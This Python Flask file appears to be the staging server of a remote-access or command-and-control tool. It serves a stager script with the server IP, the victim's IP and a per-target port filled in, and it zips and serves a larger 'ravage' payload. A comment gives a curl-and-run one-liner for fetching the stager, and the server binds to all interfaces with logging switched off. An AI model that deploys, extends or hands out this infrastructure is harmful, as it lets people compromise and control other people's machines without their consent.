from flask import Flask, request
import zipfile
import os
import threading
import target_manager
import config
import logging

app = Flask(__name__)

WEB_SERVER_PORT = '1337'


@app.route('/')
def hello_world():
    return 'Hello world'


# curl localhost:1337/wheelie > wheelie.py; python3 wheelie.py
@app.route('/wheelie')
def wheelie():
    with open(os.path.join(os.path.dirname(__file__), 'wheelie/wheelie.py')) as fh:
        data = ''.join(fh.readlines())
    for s, r in (
            ('<>SOUNDWAVE_IP</>', f"'{config.soundwave_ip}'"),
            ('<>WEB_SERVER_PORT</>', f"'{WEB_SERVER_PORT}'"),
            ('<>RAVAGE_IP</>', f"'{request.remote_addr}'"),
            ('<>COMMUNICATION_PORT</>', f"'{target_manager.new_target(request.remote_addr)}'")
    ):
        data = data.replace(s, r)

    return data


@app.route('/ravage')
def ravage():
    ravage_path = os.path.join(os.path.dirname(__file__), 'ravage')
    fn = 'ravage.zip'
    zf = zipfile.ZipFile(fn, 'w', zipfile.ZIP_DEFLATED)
    for root, dirs, files in os.walk(ravage_path):
        for file in files:
            if '__pycache__' not in root:
                zf.write(os.path.join(root, file), arcname=os.path.join(os.path.relpath(root, ravage_path), file))
    zf.close()

    with open(fn, 'rb') as fh:
        c = fh.read(1)
        data = b''
        while True:
            data += c
            if not c:
                break
            c = fh.read(1)
    os.unlink(fn)
    return data


def start():
    logging.getLogger('werkzeug').disabled = True
    os.environ['WERKZEUG_RUN_MAIN'] = 'true'

    app.logger.disabled = True
    app.run(host='0.0.0.0', port=WEB_SERVER_PORT, debug=False)


def main():
    threading.Thread(target=start, daemon=True).start()


if __name__ == '__main__':
    main()
